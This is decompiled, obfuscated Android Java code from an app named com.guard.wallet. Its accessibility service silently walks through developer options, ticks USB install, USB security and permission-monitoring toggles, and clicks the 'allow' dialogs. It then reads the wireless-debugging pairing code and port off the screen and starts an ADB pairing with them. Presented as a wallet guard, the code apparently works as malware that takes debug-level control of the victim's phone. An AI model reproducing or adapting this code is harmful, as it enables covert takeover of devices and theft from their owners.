package o;

import android.os.Build.VERSION;
import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

// $VF: synthetic class
public final class y implements Runnable {
   public final int a;
   public final a0 b;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      r.g var4 = r.g.d;
      int var1 = this.a;
      boolean var2 = true;
      a0 var7 = this.b;
      switch (var1) {
         case 0:
            a0.H(var7);
            return;
         case 1:
            a0.H(var7);
            return;
         case 2:
            var7.getClass();

            Exception var160;
            label780: {
               label779: {
                  label848: {
                     label777: {
                        AtomicInteger var146;
                        try {
                           if (!a0.t0()) {
                              break label848;
                           }

                           var7.p.set(r.g.h);
                           if (!com.guard.wallet.utils.e.i()) {
                              break label777;
                           }

                           var146 = new AtomicInteger(0);
                        } catch (Exception var78) {
                           var160 = var78;
                           boolean var200 = false;
                           break label780;
                        }

                        while (true) {
                           label851: {
                              label852: {
                                 try {
                                    var118 = var7.f0();
                                 } catch (Exception var84) {
                                    var160 = var84;
                                    boolean var201 = false;
                                    break label852;
                                 }

                                 UiObject var140 = var118;
                                 if (var118 != null) {
                                    var140 = var118;

                                    try {
                                       if (var118.canScrollForward()) {
                                          var118.scrollForwardEnd();
                                          var7.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                          com.guard.wallet.utils.g.T0(5);
                                          var140 = var7.f0();
                                       }
                                    } catch (Exception var83) {
                                       var160 = var83;
                                       boolean var202 = false;
                                       break label852;
                                    }
                                 }

                                 UiObject var136;
                                 if (var140 != null) {
                                    label762: {
                                       try {
                                          if (var140.canScrollBackward()) {
                                             var119 = var140.scrollBackwardUtil(a0.F0());
                                             break label762;
                                          }
                                       } catch (Exception var82) {
                                          var160 = var82;
                                          boolean var203 = false;
                                          break label852;
                                       }

                                       var119 = null;
                                    }

                                    var136 = var119;
                                    if (var119 == null) {
                                       var136 = var119;

                                       try {
                                          if (var140.canScrollForward()) {
                                             var136 = var140.scrollForwardUtil(a0.F0());
                                          }
                                       } catch (Exception var81) {
                                          var160 = var81;
                                          boolean var204 = false;
                                          break label852;
                                       }
                                    }
                                 } else {
                                    var136 = null;
                                 }

                                 if (var136 == null) {
                                    break label851;
                                 }

                                 try {
                                    if (var136.parent() != null && var7.g0(var136.parent(), 20).isChecked()) {
                                       var7.s = true;
                                       Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                    }
                                    break label851;
                                 } catch (Exception var80) {
                                    var160 = var80;
                                    boolean var205 = false;
                                 }
                              }

                              Exception var120 = var160;

                              try {
                                 a1.q.s("PairAccessibilityDelegate", var120);
                              } catch (Exception var51) {
                                 var160 = var51;
                                 boolean var206 = false;
                                 break label780;
                              }
                           }

                           try {
                              if (!var7.s && var146.incrementAndGet() <= 10) {
                                 com.guard.wallet.utils.g.T0(10);
                                 continue;
                              }
                           } catch (Exception var79) {
                              var160 = var79;
                              boolean var207 = false;
                              break label780;
                           }

                           try {
                              com.guard.wallet.helper.g.h(80);
                              var7.D0();
                              break;
                           } catch (Exception var50) {
                              var160 = var50;
                              boolean var208 = false;
                              break label780;
                           }
                        }
                     }

                     AtomicInteger var141;
                     try {
                        if (!com.guard.wallet.utils.e.m()) {
                           break label779;
                        }

                        var141 = new AtomicInteger(0);
                     } catch (Exception var53) {
                        var160 = var53;
                        boolean var209 = false;
                        break label780;
                     }

                     while (true) {
                        label853: {
                           label854: {
                              UiObject var149;
                              try {
                                 var149 = var7.f0();
                              } catch (Exception var77) {
                                 var160 = var77;
                                 boolean var210 = false;
                                 break label854;
                              }

                              UiObject var121;
                              if (var149 != null) {
                                 UiObject var137;
                                 z.d var147;
                                 try {
                                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                    var147 = new z.d(a0.R0(), 2, 0);
                                    var137 = var149.scrollForwardUtil(var147);
                                 } catch (Exception var76) {
                                    var160 = var76;
                                    boolean var211 = false;
                                    break label854;
                                 }

                                 var121 = var137;
                                 if (var137 == null) {
                                    try {
                                       var149.scrollBackwardEnd();
                                       var7.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                       com.guard.wallet.utils.g.T0(5);
                                       var149 = var7.f0();
                                    } catch (Exception var75) {
                                       var160 = var75;
                                       boolean var212 = false;
                                       break label854;
                                    }

                                    var121 = var137;
                                    if (var149 != null) {
                                       try {
                                          var121 = var149.scrollForwardUtil(var147);
                                       } catch (Exception var74) {
                                          var160 = var74;
                                          boolean var213 = false;
                                          break label854;
                                       }
                                    }
                                 }
                              } else {
                                 try {
                                    Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                    var121 = var7.k().findOneByCombine(a0.R0());
                                 } catch (Exception var73) {
                                    var160 = var73;
                                    boolean var214 = false;
                                    break label854;
                                 }
                              }

                              label855: {
                                 String var123;
                                 if (var121 != null) {
                                    try {
                                       Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                       var122 = var121.findParentUtilCombine(a0.q0());
                                    } catch (Exception var72) {
                                       var160 = var72;
                                       boolean var215 = false;
                                       break label854;
                                    }

                                    if (var122 != null) {
                                       try {
                                          Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                          CheckedResult var124 = a0.e0(var122);
                                          var7.t = var124.isChecked();
                                          var2 = var124.isClicked();
                                          break label855;
                                       } catch (Exception var71) {
                                          var160 = var71;
                                          boolean var216 = false;
                                          break label854;
                                       }
                                    }

                                    var123 = "USB安装可点击栏目查找失败";
                                 } else {
                                    var123 = "USB安装栏目查找失败";
                                 }

                                 try {
                                    Log.e("PairAccessibilityDelegate", var123);
                                 } catch (Exception var70) {
                                    var160 = var70;
                                    boolean var217 = false;
                                    break label854;
                                 }

                                 var2 = false;
                              }

                              if (var2) {
                                 try {
                                    Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                    com.guard.wallet.utils.g.T0(10);
                                 } catch (Exception var69) {
                                    var160 = var69;
                                    boolean var218 = false;
                                    break label854;
                                 }
                              }

                              try {
                                 if (var7.t) {
                                    Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                 }
                                 break label853;
                              } catch (Exception var68) {
                                 var160 = var68;
                                 boolean var219 = false;
                              }
                           }

                           Exception var125 = var160;

                           try {
                              a1.q.s("PairAccessibilityDelegate", var125);
                           } catch (Exception var49) {
                              var160 = var49;
                              boolean var220 = false;
                              break label780;
                           }
                        }

                        try {
                           if (var7.t || var141.incrementAndGet() > 10) {
                              break;
                           }

                           com.guard.wallet.utils.g.T0(10);
                        } catch (Exception var67) {
                           var160 = var67;
                           boolean var221 = false;
                           break label780;
                        }
                     }

                     try {
                        com.guard.wallet.helper.g.h(70);
                        var141.set(0);
                     } catch (Exception var48) {
                        var160 = var48;
                        boolean var222 = false;
                        break label780;
                     }

                     while (true) {
                        label859: {
                           label860: {
                              UiObject var151;
                              try {
                                 var151 = var7.f0();
                              } catch (Exception var65) {
                                 var160 = var65;
                                 boolean var223 = false;
                                 break label860;
                              }

                              UiObject var126;
                              if (var151 != null) {
                                 UiObject var138;
                                 z.d var148;
                                 try {
                                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                    var148 = new z.d(a0.S0(), 3, 0);
                                    var138 = var151.scrollForwardUtil(var148);
                                 } catch (Exception var64) {
                                    var160 = var64;
                                    boolean var224 = false;
                                    break label860;
                                 }

                                 var126 = var138;
                                 if (var138 == null) {
                                    try {
                                       var151.scrollBackwardEnd();
                                       var7.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                       com.guard.wallet.utils.g.T0(5);
                                       var151 = var7.f0();
                                    } catch (Exception var63) {
                                       var160 = var63;
                                       boolean var225 = false;
                                       break label860;
                                    }

                                    var126 = var138;
                                    if (var151 != null) {
                                       try {
                                          var126 = var151.scrollForwardUtil(var148);
                                       } catch (Exception var62) {
                                          var160 = var62;
                                          boolean var226 = false;
                                          break label860;
                                       }
                                    }
                                 }
                              } else {
                                 try {
                                    Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                    var126 = var7.k().findOneByCombine(a0.S0());
                                 } catch (Exception var61) {
                                    var160 = var61;
                                    boolean var227 = false;
                                    break label860;
                                 }
                              }

                              label861: {
                                 String var128;
                                 if (var126 != null) {
                                    try {
                                       Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                       var127 = var126.findParentUtilCombine(a0.q0());
                                    } catch (Exception var60) {
                                       var160 = var60;
                                       boolean var228 = false;
                                       break label860;
                                    }

                                    if (var127 != null) {
                                       try {
                                          Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                          CheckedResult var129 = a0.e0(var127);
                                          var7.u = var129.isChecked();
                                          var2 = var129.isClicked();
                                          break label861;
                                       } catch (Exception var59) {
                                          var160 = var59;
                                          boolean var229 = false;
                                          break label860;
                                       }
                                    }

                                    var128 = "USB安全设置可点击栏目查找失败";
                                 } else {
                                    var128 = "USB安全设置栏目查找失败";
                                 }

                                 try {
                                    Log.e("PairAccessibilityDelegate", var128);
                                 } catch (Exception var58) {
                                    var160 = var58;
                                    boolean var230 = false;
                                    break label860;
                                 }

                                 var2 = false;
                              }

                              try {
                                 if (var7.u) {
                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                 }
                              } catch (Exception var57) {
                                 var160 = var57;
                                 boolean var231 = false;
                                 break label860;
                              }

                              if (!var2) {
                                 break label859;
                              }

                              try {
                                 Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                 break label859;
                              } catch (Exception var56) {
                                 var160 = var56;
                                 boolean var232 = false;
                              }
                           }

                           Exception var130 = var160;

                           try {
                              a1.q.s("PairAccessibilityDelegate", var130);
                           } catch (Exception var47) {
                              var160 = var47;
                              boolean var233 = false;
                              break label780;
                           }
                        }

                        try {
                           var131 = new AtomicInteger(10);
                           var2 = var7.O();
                        } catch (Exception var46) {
                           var160 = var46;
                           boolean var234 = false;
                           break label780;
                        }

                        while (!var2) {
                           boolean var99;
                           try {
                              if (var131.decrementAndGet() < 0) {
                                 break;
                              }

                              com.guard.wallet.utils.g.T0(1);
                              var99 = var7.O();
                           } catch (Exception var66) {
                              Exception var132 = var66;

                              try {
                                 a1.q.s("PairAccessibilityDelegate", var132);
                                 break;
                              } catch (Exception var45) {
                                 var160 = var45;
                                 boolean var235 = false;
                                 break label780;
                              }
                           }

                           var2 = var99;
                        }

                        try {
                           if (var7.u) {
                              break;
                           }
                        } catch (Exception var55) {
                           var160 = var55;
                           boolean var236 = false;
                           break label780;
                        }

                        if (var2) {
                           break;
                        }

                        try {
                           if (var141.incrementAndGet() > 10) {
                              break;
                           }

                           com.guard.wallet.utils.g.T0(10);
                        } catch (Exception var54) {
                           var160 = var54;
                           boolean var237 = false;
                           break label780;
                        }
                     }

                     try {
                        com.guard.wallet.helper.g.h(80);
                        if (!var7.u) {
                           break label779;
                        }

                        Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                     } catch (Exception var52) {
                        var160 = var52;
                        boolean var238 = false;
                        break label780;
                     }
                  }

                  try {
                     var7.D0();
                  } catch (Exception var44) {
                     var160 = var44;
                     boolean var239 = false;
                     break label780;
                  }
               }

               try {
                  var7.o.remove("pairInPrepareFinish");
                  return;
               } catch (Exception var43) {
                  var160 = var43;
                  boolean var240 = false;
               }
            }

            Exception var133 = var160;
            a1.q.s("PairAccessibilityDelegate", var133);
            return;
         case 3:
            var7.getClass();

            Exception var159;
            label844: {
               try {
                  var7.o.remove("pairInPairSuccess");
                  if (!a0.t0()) {
                     var7.D0();
                     return;
                  }
               } catch (Exception var42) {
                  var159 = var42;
                  boolean var196 = false;
                  break label844;
               }

               label845: {
                  try {
                     if (!com.guard.wallet.utils.e.m() || VERSION.SDK_INT < 35) {
                        break label845;
                     }

                     if (a1.q.b()) {
                        com.guard.wallet.utils.g.T0(5);
                        if (!a1.q.A()) {
                           a1.q.O(null, null);
                        }
                     }
                  } catch (Exception var41) {
                     var159 = var41;
                     boolean var197 = false;
                     break label844;
                  }

                  try {
                     var2 = com.guard.wallet.utils.g.f1();
                  } catch (Exception var40) {
                     var159 = var40;
                     boolean var198 = false;
                     break label844;
                  }

                  if (var2) {
                     return;
                  }
               }

               try {
                  com.guard.wallet.utils.g.F0(1);
                  Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                  Thread.sleep(100L);
                  return;
               } catch (Exception var39) {
                  Exception var116 = var39;

                  try {
                     a1.q.s("PairAccessibilityDelegate", var116);
                     return;
                  } catch (Exception var38) {
                     var159 = var38;
                     boolean var199 = false;
                  }
               }
            }

            Exception var117 = var159;
            a1.q.s("PairAccessibilityDelegate", var117);
            return;
         case 4:
            AtomicReference var134 = var7.p;

            Exception var157;
            label838: {
               try {
                  if (Objects.equals(var134.get(), var4)) {
                     return;
                  }

                  var7.G();
                  Log.d("PairAccessibilityDelegate", "active root complete");
                  var134.set(r.g.c);
                  a0.R(var7.k());
               } catch (Exception var37) {
                  var157 = var37;
                  boolean var187 = false;
                  break label838;
               }

               label572: {
                  label571: {
                     label839: {
                        CombineFilter var139;
                        try {
                           var139 = a0.u0();
                        } catch (Exception var36) {
                           var111 = var36;
                           var135 = null;
                           break label839;
                        }

                        var112 = null;

                        label840: {
                           while (var112 == null) {
                              var135 = var112;

                              try {
                                 if (var7.k() == null) {
                                    break;
                                 }
                              } catch (Exception var35) {
                                 var157 = var35;
                                 boolean var188 = false;
                                 break label840;
                              }

                              var135 = var112;

                              try {
                                 var112 = var7.k().findOneByCombine(var139);
                              } catch (Exception var34) {
                                 var157 = var34;
                                 boolean var189 = false;
                                 break label840;
                              }

                              var135 = var112;

                              try {
                                 com.guard.wallet.utils.g.T0(5);
                              } catch (Exception var33) {
                                 var157 = var33;
                                 boolean var190 = false;
                                 break label840;
                              }
                           }

                           var135 = var112;
                           if (var112 == null) {
                              break label572;
                           }

                           var135 = var112;

                           try {
                              Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                              break label571;
                           } catch (Exception var32) {
                              var157 = var32;
                              boolean var191 = false;
                           }
                        }

                        var111 = var157;
                     }

                     try {
                        a1.q.s("PairAccessibilityDelegate", var111);
                        break label572;
                     } catch (Exception var31) {
                        var157 = var31;
                        boolean var192 = false;
                        break label838;
                     }
                  }

                  var135 = var112;
               }

               String var114;
               if (var135 != null) {
                  try {
                     Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                     com.guard.wallet.helper.g.h(30);
                     var113 = var135.findParentUtilCombine(a0.T());
                  } catch (Exception var30) {
                     var157 = var30;
                     boolean var193 = false;
                     break label838;
                  }

                  if (var113 != null) {
                     try {
                        if (var113.click()) {
                           Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                           com.guard.wallet.helper.g.h(35);
                           return;
                        }
                     } catch (Exception var29) {
                        var157 = var29;
                        boolean var194 = false;
                        break label838;
                     }
                  }

                  var114 = "使用配对码配对栏目点击失败";
               } else {
                  var114 = "使用配对码配对栏目查找失败";
               }

               try {
                  Log.e("PairAccessibilityDelegate", var114);
                  return;
               } catch (Exception var28) {
                  var157 = var28;
                  boolean var195 = false;
               }
            }

            Exception var115 = var157;
            a1.q.s("PairAccessibilityDelegate", var115);
            return;
         case 5:
            var7.getClass();

            Exception var155;
            label868: {
               boolean var3;
               try {
                  var3 = var7.M();
               } catch (Exception var27) {
                  var155 = var27;
                  boolean var176 = false;
                  break label868;
               }

               String var5;
               AtomicReference var6;
               var6 = var7.p;
               var5 = var7.c;
               label520:
               if (var3) {
                  Future var143;
                  try {
                     if (var7.Q() || Objects.equals(var6.get(), var4)) {
                        break label520;
                     }

                     Object var9 = var6.get();
                     r.g var8 = r.g.f;
                     if (Objects.equals(var9, var8)) {
                        break label520;
                     }

                     Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                     var7.G();
                     Log.d("PairAccessibilityDelegate", "active root complete");
                     var6.set(var8);
                     com.guard.wallet.thread.h var142 = new com.guard.wallet.thread.h(var7);
                     var143 = com.guard.wallet.thread.l.b(var142, var5);
                  } catch (Exception var26) {
                     var155 = var26;
                     boolean var177 = false;
                     break label868;
                  }

                  label502:
                  if (var143 != null) {
                     while (true) {
                        try {
                           if (var143.isDone()) {
                              break;
                           }

                           Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                           com.guard.wallet.utils.g.T0(2);
                        } catch (Exception var25) {
                           var155 = var25;
                           boolean var178 = false;
                           break label868;
                        }
                     }

                     label835: {
                        try {
                           var144 = (PairPortAndCodeResult)var143.get();
                        } catch (Exception var23) {
                           var155 = var23;
                           boolean var179 = false;
                           break label835;
                        }

                        label497:
                        if (var144 != null) {
                           try {
                              Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                              com.guard.wallet.helper.g.h(40);
                              if (h.e.S() == null) {
                                 break label502;
                              }

                              Log.d("PairAccessibilityDelegate", "正在发起配对");
                              h.e.S().m.set(false);
                              h.e.S().K(var144.getHost(), var144.getPairPort(), var144.getPairCode());
                              if (h.e.S().U()) {
                                 Log.d("PairAccessibilityDelegate", "本次配对成功");
                                 com.guard.wallet.helper.g.h(45);
                                 var6.set(var4);
                                 break label502;
                              }
                           } catch (Exception var24) {
                              var155 = var24;
                              boolean var181 = false;
                              break label497;
                           }

                           try {
                              Log.d("PairAccessibilityDelegate", "本次配对失败");
                              break label502;
                           } catch (Exception var21) {
                              var155 = var21;
                              boolean var182 = false;
                           }
                        } else {
                           try {
                              Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                              break label502;
                           } catch (Exception var22) {
                              var155 = var22;
                              boolean var180 = false;
                           }
                        }
                     }

                     Exception var145 = var155;

                     try {
                        a1.q.s("PairAccessibilityDelegate", var145);
                     } catch (Exception var20) {
                        var155 = var20;
                        boolean var183 = false;
                        break label868;
                     }
                  }
               }

               try {
                  if (!Objects.equals(var6.get(), var4)) {
                     var6.set(r.g.g);
                  }
               } catch (Exception var19) {
                  var155 = var19;
                  boolean var184 = false;
                  break label868;
               }

               label473: {
                  try {
                     if (!var7.M()) {
                        return;
                     }

                     Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                     if (var6.get() == var4) {
                        break label473;
                     }
                  } catch (Exception var18) {
                     var155 = var18;
                     boolean var185 = false;
                     break label868;
                  }

                  var2 = false;
               }

               try {
                  com.guard.wallet.thread.g var110 = new com.guard.wallet.thread.g(var2, var7);
                  com.guard.wallet.thread.l.b(var110, var5);
                  return;
               } catch (Exception var17) {
                  var155 = var17;
                  boolean var186 = false;
               }
            }

            Exception var109 = var155;
            a1.q.s("PairAccessibilityDelegate", var109);
            return;
         case 6:
            var7.getClass();

            Exception var154;
            while (true) {
               label830: {
                  try {
                     if (var7.N()) {
                        var107 = var7.k().findOneByCombine(a0.V());
                        break label830;
                     }
                  } catch (Exception var16) {
                     var154 = var16;
                     boolean var173 = false;
                     break;
                  }

                  ConcurrentLinkedQueue var106 = var7.o;

                  try {
                     var106.remove("pairInWifiDebugWindow");
                     var106.remove("pairInPairCodeDialog");
                     var106.remove("pairInPairFailDialog");
                     return;
                  } catch (Exception var15) {
                     var154 = var15;
                     boolean var174 = false;
                     break;
                  }
               }

               if (var107 != null) {
                  try {
                     if (var107.click()) {
                        Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                        com.guard.wallet.utils.g.T0(10);
                     }
                  } catch (Exception var14) {
                     var154 = var14;
                     boolean var175 = false;
                     break;
                  }
               }
            }

            Exception var108 = var154;
            a1.q.s("PairAccessibilityDelegate", var108);
            return;
         case 7:
            var7.getClass();

            while (true) {
               Exception var153;
               label827: {
                  try {
                     var2 = var7.q(i.L());
                  } catch (Exception var13) {
                     var153 = var13;
                     boolean var170 = false;
                     break label827;
                  }

                  if (!var2) {
                     break;
                  }

                  try {
                     com.guard.wallet.utils.g.F0(1);
                     Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                     Thread.sleep(100L);
                  } catch (Exception var12) {
                     Exception var104 = var12;

                     try {
                        a1.q.s("PairAccessibilityDelegate", var104);
                     } catch (Exception var11) {
                        var153 = var11;
                        boolean var171 = false;
                        break label827;
                     }
                  }

                  try {
                     com.guard.wallet.utils.g.T0(5);
                     continue;
                  } catch (Exception var10) {
                     var153 = var10;
                     boolean var172 = false;
                  }
               }

               Exception var105 = var153;
               a1.q.s("PairAccessibilityDelegate", var105);
               break;
            }

            return;
         default:
            var7.getClass();

            Exception var10000;
            label865: {
               try {
                  Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                  var100 = var7.k().findOneByCombine(a0.K0());
               } catch (Exception var92) {
                  var10000 = var92;
                  boolean var10001 = false;
                  break label865;
               }

               if (var100 != null) {
                  try {
                     if (var100.clickable() && var100.click()) {
                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                        var7.o.remove("pairInSecurityCenter");
                        return;
                     }
                  } catch (Exception var91) {
                     var10000 = var91;
                     boolean var164 = false;
                     break label865;
                  }
               }

               try {
                  var101 = var7.k().findOneByCombine(a0.J0());
               } catch (Exception var90) {
                  var10000 = var90;
                  boolean var165 = false;
                  break label865;
               }

               if (var101 == null) {
                  return;
               }

               try {
                  Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                  if (!var101.clickable()) {
                     return;
                  }

                  Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                  if (!var101.click()) {
                     return;
                  }

                  Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                  com.guard.wallet.utils.g.T0(10);
               } catch (Exception var87) {
                  var10000 = var87;
                  boolean var166 = false;
                  break label865;
               }

               while (true) {
                  label807: {
                     label806: {
                        try {
                           if (var7.k() != null && var7.k().findOneByCombine(a0.L0()) != null) {
                              Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                              break label806;
                           }
                        } catch (Exception var89) {
                           Exception var102 = var89;

                           try {
                              a1.q.s("PairAccessibilityDelegate", var102);
                           } catch (Exception var86) {
                              var10000 = var86;
                              boolean var167 = false;
                              break;
                           }
                        }

                        var93 = false;
                        break label807;
                     }

                     var93 = true;
                  }

                  if (!var93) {
                     try {
                        var7.u = true;
                        var7.D0();
                        return;
                     } catch (Exception var85) {
                        var10000 = var85;
                        boolean var169 = false;
                        break;
                     }
                  }

                  try {
                     Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                     com.guard.wallet.utils.g.T0(5);
                  } catch (Exception var88) {
                     var10000 = var88;
                     boolean var168 = false;
                     break;
                  }
               }
            }

            Exception var103 = var10000;
            a1.q.s("PairAccessibilityDelegate", var103);
      }
   }
}
